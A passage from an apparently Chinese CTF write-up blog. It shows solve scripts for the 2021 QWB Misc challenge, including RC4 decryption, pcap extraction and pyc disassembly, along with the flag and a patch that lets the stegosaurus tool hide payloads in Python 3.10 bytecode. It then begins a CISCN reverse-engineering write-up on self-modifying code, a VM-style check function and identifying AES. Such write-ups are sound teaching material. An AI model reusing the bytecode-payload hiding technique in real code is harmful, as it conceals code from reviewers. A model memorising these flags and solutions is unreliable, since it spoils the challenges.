class="title">PRGA</span>(<span class="params">S</span>):</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    j=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i=(i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">        j=(j+S[i])%<span class="number">256</span></span><br><span class="line">        S[j],S[i]=S[i],S[j]</span><br><span class="line">        K=S[(S[i]+S[j])%<span class="number">256</span>]</span><br><span class="line">        <span class="keyword">yield</span> K</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RC4</span>(<span class="params">key</span>):</span></span><br><span class="line">    S=KSA(key)</span><br><span class="line">    <span class="keyword">return</span> PRGA(S)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">p,stream</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x:x^stream.__next__(),p))</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    w=<span class="string">b&#x27;\xf6\xef\x10H\xa9\x0f\x9f\xb5\x80\xc1xd\xae\xd3\x03\xb2\x84\xc2\xb4\x0e\xc8\xf3&lt;\x151\x19\n\x8f&#x27;</span></span><br><span class="line">    e=<span class="string">b&#x27;$\r9\xa3\x18\xddW\xc9\x97\xf3\xa7\xa8R~&#x27;</span></span><br><span class="line">    b=<span class="string">b&#x27;geo&#x27;</span></span><br><span class="line">    s=<span class="string">b&#x27;&#125;\xce`\xbej\xa2\x120\xb5\x8a\x94\x14&#123;\xa3\x86\xc8\xc7\x01\x98\xa3_\x91\xd8\x82T*V\xab\xe0\xa1\x141&#x27;</span></span><br><span class="line">    t=<span class="string">b&quot;Q_\xe2\xf8\x8c\x11M&#125;&#x27;&lt;@\xceT\xf6?_m\xa4\xf8\xb4\xea\xca\xc7:\xb9\xe6\x06\x8b\xeb\xfabH\x85xJ3$\xdd\xde\xb6\xdc\xa0\xb8b\x961\xb7\x13=\x17\x13\xb1&quot;</span></span><br><span class="line">    m=&#123;<span class="number">2</span>:<span class="number">115</span>,<span class="number">8</span>:<span class="number">97</span>,<span class="number">11</span>:<span class="number">117</span>,<span class="number">10</span>:<span class="number">114</span>&#125;</span><br><span class="line">    n=&#123;<span class="number">3</span>:<span class="number">119</span>,<span class="number">7</span>:<span class="number">116</span>,<span class="number">9</span>:<span class="number">124</span>,<span class="number">12</span>:<span class="number">127</span>&#125;</span><br><span class="line">    m|=&#123;x:x^n[x] <span class="keyword">for</span> x <span class="keyword">in</span> n&#125;</span><br><span class="line">    m|=((i.bit_count(),i) <span class="keyword">for</span> i <span class="keyword">in</span> b)</span><br><span class="line">    stream=RC4(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x:x[<span class="number">1</span>],<span class="built_in">sorted</span>(m.items()))))</span><br><span class="line">    print(xor(w,stream).decode())</span><br><span class="line">    <span class="comment"># p=sys.stdin.buffer.read()</span></span><br><span class="line">    p=<span class="string">b&#x27;\xe5\x0a\x32\xd6\x22\xf0\x7d\x49\xb0\xcd\xa2\x11\xf0\xb4\x55\x16\x36\xc5\x6f\xdb\xc9\xea\x64\x04\x15\x62&#x27;</span></span><br><span class="line">    e=xor(e,stream)</span><br><span class="line">    c=xor(p,stream)</span><br><span class="line">    print(c)</span><br><span class="line">    <span class="keyword">if</span> sha256(c).digest()==s:</span><br><span class="line">        print(xor(t,stream).decode())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(e.decode())</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2021qwb/image-20210614154912394.png"></p><p>拿到<strong>flag</strong>：flag{P0w5rFu1_0pEn_50urcE}</p><h2 id="赛后改进"><a href="#赛后改进" class="headerlink" title="赛后改进"></a>赛后改进</h2><h3 id="用python提取pcapng"><a href="#用python提取pcapng" class="headerlink" title="用python提取pcapng"></a>用python提取pcapng</h3><p>比赛的时候是直接硬提取的流量包里的纯文本的，写脚本比较麻烦XD</p><p>后来看到Nu1l的wp调用了一个库<code>python-pcapng</code>，感觉可行，来学着写一下脚本试试。</p><p>再后来报错搞不定，找了另一个包<code>pyshark</code>写脚本有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">cap=pyshark.FileCapture(<span class="string">&#x27;./ExtremelySlow.pcapng&#x27;</span>,display_filter=<span class="string">&quot;data&quot;</span>)</span><br><span class="line">data=[]</span><br><span class="line"><span class="keyword">for</span> packet <span class="keyword">in</span> cap:</span><br><span class="line">    content=packet[<span class="string">&#x27;HTTP&#x27;</span>].get_field_by_showname(<span class="string">&#x27;content-range&#x27;</span>).showname_value</span><br><span class="line">    key=<span class="built_in">int</span>(re.findall(<span class="string">r&quot;\d+&quot;</span>,content)[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        val=packet[<span class="string">&#x27;DATA&#x27;</span>].data.binary_value</span><br><span class="line">    <span class="keyword">except</span> AttributeError:</span><br><span class="line">        val=<span class="built_in">bytes</span>(<span class="built_in">chr</span>(packet[<span class="string">&#x27;DATA&#x27;</span>].tcp_reassembled_data.binary_value[<span class="number">-1</span>]),encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        data.append((key,val))</span><br><span class="line"></span><br><span class="line">data=<span class="built_in">sorted</span>(data,key=<span class="keyword">lambda</span> t:t[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./res&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> data:</span><br><span class="line">        f.write(t[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h3 id="反汇编pyc文件"><a href="#反汇编pyc文件" class="headerlink" title="反汇编pyc文件"></a>反汇编pyc文件</h3><p>反汇编pyc还可以用以下的小脚本（来自<a href="https://stackoverflow.com/questions/32562163/how-can-i-understand-a-pyc-file-content">python - How can I understand a .pyc file content - Stack Overflow</a>）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis, marshal, sys</span><br><span class="line"></span><br><span class="line">header_sizes = [</span><br><span class="line">    <span class="comment"># (size, first version this applies to)</span></span><br><span class="line">    <span class="comment"># pyc files were introduced in 0.9.2 way, way back in June 1991.</span></span><br><span class="line">    (<span class="number">8</span>,  (<span class="number">0</span>, <span class="number">9</span>, <span class="number">2</span>)),  <span class="comment"># 2 bytes magic number, \r\n, 4 bytes UNIX timestamp</span></span><br><span class="line">    (<span class="number">12</span>, (<span class="number">3</span>, <span class="number">6</span>)),     <span class="comment"># added 4 bytes file size</span></span><br><span class="line">    <span class="comment"># bytes 4-8 are flags, meaning of 9-16 depends on what flags are set</span></span><br><span class="line">    <span class="comment"># bit 0 not set: 9-12 timestamp, 13-16 file size</span></span><br><span class="line">    <span class="comment"># bit 0 set: 9-16 file hash (SipHash-2-4, k0 = 4 bytes of the file, k1 = 0)</span></span><br><span class="line">    (<span class="number">16</span>, (<span class="number">3</span>, <span class="number">7</span>)),     <span class="comment"># inserted 4 bytes bit flag field at 4-8 </span></span><br><span class="line">    <span class="comment"># future version may add more bytes still, at which point we can extend</span></span><br><span class="line">    <span class="comment"># this table. It is correct for Python versions up to 3.9</span></span><br><span class="line">]</span><br><span class="line">header_size = <span class="built_in">next</span>(s <span class="keyword">for</span> s, v <span class="keyword">in</span> <span class="built_in">reversed</span>(header_sizes) <span class="keyword">if</span> sys.version_info &gt;= v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(pycfile, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    metadata = f.read(header_size)  <span class="comment"># first header_size bytes are metadata</span></span><br><span class="line">    code = marshal.load(f)          <span class="comment"># rest is a marshalled code object</span></span><br><span class="line"></span><br><span class="line">dis.dis(code)</span><br></pre></td></tr></table></figure><h3 id="魔改stegosaurus"><a href="#魔改stegosaurus" class="headerlink" title="魔改stegosaurus"></a>魔改stegosaurus</h3><p>反编译器魔改估计得写很长，有空专门开一篇文章（咕咕咕）。</p><p>这里魔改一下stegosaurus，让它支持3.10版本。</p><p>（仓库指路：<a href="https://github.com/c10udlnk/stegosaurus">c10udlnk&#x2F;stegosaurus: 添加python3.10支持。A steganography tool for embedding payloads within Python bytecode.</a></p><p>首先执行<code>python3.10 stegosaurus.py res.pyc -x</code>，报错：</p><p><img src="/p/wpFor-2021qwb/image-20210714110022076.png"></p><p>在<code>stegosaurus.py</code>定位到出错代码：</p><p><img src="/p/wpFor-2021qwb/image-20210714110050500.png"></p><p>从这里（<a href="https://zhuanlan.zhihu.com/p/145811103">Python代码保护 | pyc 混淆从入门到工具实现 - 知乎</a>）可以知道，3.5和3.6的header有12字节，而3.7开始支持校验hash值，又多了4字节出来，所以header这里要加一行版本的判断。</p><p><img src="/p/wpFor-2021qwb/image-20210714111942133.png"></p><p>然后继续报错：</p><p><img src="/p/wpFor-2021qwb/image-20210714112041335.png"></p><p>这里可以知道是编码的问题</p><p><img src="/p/wpFor-2021qwb/image-20210714112123741.png"></p><p>而payload里有不可见字符，所以干脆就直接把转码去掉就好。</p><p><img src="/p/wpFor-2021qwb/image-20210714112401389.png"></p><p>魔改get √</p>]]></content>
      
      
      <categories>
          
          <category> Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Misc </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【wp】2021CISCN华南赛区分区赛-BadGameAndCrazy</title>
      <link href="p/wpFor-2021CISCNsemifinal/"/>
      <url>p/wpFor-2021CISCNsemifinal/</url>
      
        <content type="html"><![CDATA[<p>考完期末就来填一下坑，顺便总结一下逆向题目中的密码算法识别，是分区赛搞了大半天磕出来的一道逆向题<code>BadGameAndCrazy</code>，这道题真的是<strong>各种原装密码算法的大杂烩</strong>，非常值得总结（终于不是MISC了Ohhhhh，<del>虽然是因为没有杂项题可以做</del></p><p>做完以后以为这个题这么简单会被打穿的（毕竟就是堆了一堆密码算法+爆破密钥这样，自己推完密码算法以后才发现hint直接给出来了就离谱555555），结果出乎意料地跟一血失之交臂拿了二血，最后也只是几个队解了而已（隐约记得是五六个队来着</p><a id="more"></a><h1 id="【Reverse】BadGameAndCrazy"><a href="#【Reverse】BadGameAndCrazy" class="headerlink" title="【Reverse】BadGameAndCrazy"></a>【Reverse】BadGameAndCrazy</h1><h2 id="SMC处理"><a href="#SMC处理" class="headerlink" title="SMC处理"></a>SMC处理</h2><p>看到<code>main()</code>函数：</p><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210709165248548.png"></p><p>看到<code>printf()</code>和<code>scanf()</code>这里有乱码，而且主函数中前面也没有能修改的，所以猜测在主函数执行之前的某个函数有smc处理，由经验可以猜到很大概率就是初始化函数<code>_libc_csu_init()</code>，去看函数内容果然有。</p><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210709165724432.png"></p><p><code>funcs_4177A9</code>是一个函数地址表，用for循环依次调用，可以看到<code>sub_4020D0()</code>中就有对该数组<code>asc_41D1E0</code>的自修改，同时还有对其余常量数组的修改。</p><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210709170220045.png"></p><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210709170237374.png"></p><p>懒得静态还原了，直接动态调试把smc过了，断点设在主函数就好。</p><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210709171329528.png"></p><p>可以看到字符串被还原了。</p><h2 id="主函数逻辑"><a href="#主函数逻辑" class="headerlink" title="主函数逻辑"></a>主函数逻辑</h2><p>接下来看<code>sub_4011B0()</code>，是很多赋值操作，也可以用动态调试直接过掉。</p><p>需要注意的是，这里是用常量和输入的42个字符（传进来的参数<code>a1</code>，主函数的<code>v12</code>，输入部分）来填传进来的参数<code>a2</code>（也就是主函数的<code>v5</code>）这一大块空间。为了<del>省事</del> 迅速地判断是怎么填的，输入字符可以用<code>asdfghjklqwertyuiopzxcvbnm1234567890ASDFGH</code>这一串，<strong>不仅是可见字符而且还能确定顺序</strong>，这样在动态调试之后直接看主函数的<code>v5</code>就知道缺什么值了（当然这种方法只适合原数组里可见字符较少、而且填上去大致是连续的情况）。</p><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210709171503922.png"></p><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210711110122182.png"></p><p>这样可以推断出<code>v5</code>这块大空间（后面称为<code>STRING</code>）里装的是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">STRING=INPUT[<span class="number">0</span>:<span class="number">4</span>]+<span class="string">&quot;\xf4\xa86\xd2&quot;</span>+INPUT[<span class="number">4</span>:<span class="number">12</span>]+<span class="string">&quot;\rh\xd3\xec\xef\xbcQhA\xd4\x0e\xf8)\x10)`\xf6\xb9y\x1aP\xe7&gt;\xec/\xca\xd3\xfc&quot;</span>+INPUT[<span class="number">12</span>:<span class="number">38</span>]+<span class="string">&quot;\x94Zm&#123;&quot;</span>+INPUT[<span class="number">38</span>:<span class="number">42</span>]</span><br></pre></td></tr></table></figure><p>再往后看check部分都是由<code>sub_401880()</code>这个函数完成，只是参数不一样，很明显是个vmp，通过参数来控制程序流程。</p><p>check：</p><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210709174514106.png"></p><p><code>sub_401880()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">sub_401880</span><span class="params">(<span class="keyword">unsigned</span> __int8 a1, <span class="keyword">unsigned</span> __int8 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *v7; <span class="comment">// [rsp+8h] [rbp-C8h]</span></span><br><span class="line">  _QWORD *v8; <span class="comment">// [rsp+18h] [rbp-B8h]</span></span><br><span class="line">  _QWORD *v9; <span class="comment">// [rsp+28h] [rbp-A8h]</span></span><br><span class="line">  _QWORD *v10; <span class="comment">// [rsp+38h] [rbp-98h]</span></span><br><span class="line">  <span class="keyword">void</span> *v11; <span class="comment">// [rsp+40h] [rbp-90h]</span></span><br><span class="line">  __m128i *v12; <span class="comment">// [rsp+50h] [rbp-80h]</span></span><br><span class="line">  __m128i *v13; <span class="comment">// [rsp+60h] [rbp-70h]</span></span><br><span class="line">  __m128i *v14; <span class="comment">// [rsp+70h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">void</span> *s1; <span class="comment">// [rsp+78h] [rbp-58h]</span></span><br><span class="line">  _DWORD *v16; <span class="comment">// [rsp+88h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">bool</span> v18; <span class="comment">// [rsp+CFh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8u</span>:</span><br><span class="line">      v8 = (_QWORD *)sub_4016C0(a2);</span><br><span class="line">      v18 = *v8 == *(_QWORD *)sub_4014E0(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x5C</span>u:</span><br><span class="line">      v11 = (<span class="keyword">void</span> *)sub_4016C0(a2);</span><br><span class="line">      v4 = (<span class="keyword">const</span> <span class="keyword">void</span> *)sub_4013B0(&amp;byte_41D1A0, a3, <span class="number">30L</span>L);</span><br><span class="line">      v18 = <span class="built_in">memcmp</span>(v11, v4, <span class="number">0x1E</span>uLL) == <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x72</span>u:</span><br><span class="line">      v7 = (<span class="keyword">void</span> *)sub_4016C0(a2);</span><br><span class="line">      v5 = (<span class="keyword">const</span> <span class="keyword">void</span> *)sub_401520(a3);</span><br><span class="line">      v18 = <span class="built_in">memcmp</span>(v7, v5, <span class="number">0x20</span>uLL) == <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x91</span>u:</span><br><span class="line">      v12 = (__m128i *)sub_4016C0(a2);</span><br><span class="line">      v18 = _mm_movemask_epi8(_mm_cmpeq_epi8(*v12, *(__m128i *)sub_401340(&amp;byte_41D180, a3))) == <span class="number">0xFFFF</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x94</span>u:</span><br><span class="line">      v14 = (__m128i *)sub_4016C0(a2);</span><br><span class="line">      v18 = _mm_movemask_epi8(_mm_cmpeq_epi8(*v14, *(__m128i *)sub_401580(a3))) == <span class="number">0xFFFF</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x9D</span>u:</span><br><span class="line">      v13 = (__m128i *)sub_4016C0(a2);</span><br><span class="line">      v18 = _mm_movemask_epi8(_mm_cmpeq_epi8(*v13, *(__m128i *)sub_4015D0(a3))) == <span class="number">0xFFFF</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xAC</span>u:</span><br><span class="line">      v10 = (_QWORD *)sub_4016C0(a2);</span><br><span class="line">      v18 = *v10 == *(_QWORD *)sub_4012E0(&amp;byte_41D1BF, a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xB4</span>u:</span><br><span class="line">      s1 = (<span class="keyword">void</span> *)sub_4016C0(a2);</span><br><span class="line">      v3 = (<span class="keyword">const</span> <span class="keyword">void</span> *)sub_401480(a3);</span><br><span class="line">      v18 = <span class="built_in">memcmp</span>(s1, v3, <span class="number">0x14</span>uLL) == <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xB5</span>u:</span><br><span class="line">      v9 = (_QWORD *)sub_4016C0(a2);</span><br><span class="line">      v18 = *v9 == *(_QWORD *)sub_401620(&amp;byte_41D1C8, a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xF2</span>u:</span><br><span class="line">      v16 = (_DWORD *)sub_4016C0(a2);</span><br><span class="line">      v18 = *v16 == *(_DWORD *)sub_401670(a3, <span class="number">4L</span>L);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      v18 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v18;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，switch的每个case基本上都是由<code>sub_4016C0()</code>+其他函数组成，而<code>sub_4016C0()</code>是根据对应参数返回一个常量数组用作比较，每个case的最后一行都是用<code>==</code>或者<code>memcpy()</code>或者<code>_mm_cmpeq_epi8()</code>来做这个比较。</p><p><code>sub_4016C0()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">sub_4016C0</span><span class="params">(<span class="keyword">unsigned</span> __int8 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xC</span>u:</span><br><span class="line">      <span class="keyword">return</span> &amp;byte_41D110;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x20</span>u:</span><br><span class="line">      <span class="keyword">return</span> &amp;byte_41D0F0;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x4F</span>u:</span><br><span class="line">      <span class="keyword">return</span> &amp;byte_41D101;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x68</span>u:</span><br><span class="line">      <span class="keyword">return</span> &amp;byte_41D140;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x77</span>u:</span><br><span class="line">      <span class="keyword">return</span> &amp;byte_41D0A0;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x8C</span>u:</span><br><span class="line">      <span class="keyword">return</span> &amp;byte_41D080;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x9F</span>u:</span><br><span class="line">      <span class="keyword">return</span> &amp;byte_41D0D0;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xA9</span>u:</span><br><span class="line">      <span class="keyword">return</span> &amp;byte_41D070;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xC9</span>u:</span><br><span class="line">      <span class="keyword">return</span> &amp;byte_41D0E1;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xDD</span>u:</span><br><span class="line">      <span class="keyword">return</span> &amp;byte_41D0BF;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &amp;byte_41D160;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由此可见，在反复用来check的函数<code>sub_401880()</code>中，第一个参数是用来控制程序流程（即进入哪个加密算法进行处理），第二个参数用来操控用于比较的常量数组，第三个参数是传入本部分最开头提到的大空间<code>v5</code>的部分值作为明文（<code>v5</code>到<code>v11</code>在空间上是连续的）。</p><p>流程不多，直接手推vm即可。考点应该在各种加密算法的识别上，没有魔改我真是谢谢他，不然就做不出来了x</p><h2 id="加密算法识别"><a href="#加密算法识别" class="headerlink" title="加密算法识别"></a>加密算法识别</h2><p>所有的加密算法基本是用常量数组+大致加密流程在推，这里放一下各个case的结果和标志，方便以后做题的时候找加密算法xd</p><p>混淆后的实现方法可以直接在题目里看，太长不贴（</p><p>注意传进去的<code>STRING</code>是明文还是密钥要用具体的实现方式来对比。</p><h3 id="对称密码-AES"><a href="#对称密码-AES" class="headerlink" title="[对称密码] AES"></a>[对称密码] AES</h3><blockquote><p>具体实现：<a href="https://github.com/dhuertas/AES/blob/master/aes.c">AES&#x2F;aes.c at master · dhuertas&#x2F;AES</a></p><p>在本题中对应<code>sub_401880()</code>里的<code>case 0x91u</code></p></blockquote><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210711180228630.png"></p><p>在<code>sub_401340() -&gt; sub_4039B0()</code>里可以看到AES经典选择流程（<code>AES128 or AES192 or AES256</code>）：</p><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210711180414540.png"></p><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210711213542146.png"></p><p>还有<code>sub_401340() -&gt; sub_4039B0() -&gt; sub_404560()</code>里AES的S盒：</p><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210711213145179.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">uint8_t</span> s_box[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="comment">// 0     1     2     3     4     5     6     7     8     9     a     b     c     d     e     f</span></span><br><span class="line"><span class="number">0x63</span>, <span class="number">0x7c</span>, <span class="number">0x77</span>, <span class="number">0x7b</span>, <span class="number">0xf2</span>, <span class="number">0x6b</span>, <span class="number">0x6f</span>, <span class="number">0xc5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2b</span>, <span class="number">0xfe</span>, <span class="number">0xd7</span>, <span class="number">0xab</span>, <span class="number">0x76</span>, <span class="comment">// 0</span></span><br><span class="line"><span class="number">0xca</span>, <span class="number">0x82</span>, <span class="number">0xc9</span>, <span class="number">0x7d</span>, <span class="number">0xfa</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xf0</span>, <span class="number">0xad</span>, <span class="number">0xd4</span>, <span class="number">0xa2</span>, <span class="number">0xaf</span>, <span class="number">0x9c</span>, <span class="number">0xa4</span>, <span class="number">0x72</span>, <span class="number">0xc0</span>, <span class="comment">// 1</span></span><br><span class="line"><span class="number">0xb7</span>, <span class="number">0xfd</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3f</span>, <span class="number">0xf7</span>, <span class="number">0xcc</span>, <span class="number">0x34</span>, <span class="number">0xa5</span>, <span class="number">0xe5</span>, <span class="number">0xf1</span>, <span class="number">0x71</span>, <span class="number">0xd8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>, <span class="comment">// 2</span></span><br><span class="line"><span class="number">0x04</span>, <span class="number">0xc7</span>, <span class="number">0x23</span>, <span class="number">0xc3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9a</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xe2</span>, <span class="number">0xeb</span>, <span class="number">0x27</span>, <span class="number">0xb2</span>, <span class="number">0x75</span>, <span class="comment">// 3</span></span><br><span class="line"><span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2c</span>, <span class="number">0x1a</span>, <span class="number">0x1b</span>, <span class="number">0x6e</span>, <span class="number">0x5a</span>, <span class="number">0xa0</span>, <span class="number">0x52</span>, <span class="number">0x3b</span>, <span class="number">0xd6</span>, <span class="number">0xb3</span>, <span class="number">0x29</span>, <span class="number">0xe3</span>, <span class="number">0x2f</span>, <span class="number">0x84</span>, <span class="comment">// 4</span></span><br><span class="line"><span class="number">0x53</span>, <span class="number">0xd1</span>, <span class="number">0x00</span>, <span class="number">0xed</span>, <span class="number">0x20</span>, <span class="number">0xfc</span>, <span class="number">0xb1</span>, <span class="number">0x5b</span>, <span class="number">0x6a</span>, <span class="number">0xcb</span>, <span class="number">0xbe</span>, <span class="number">0x39</span>, 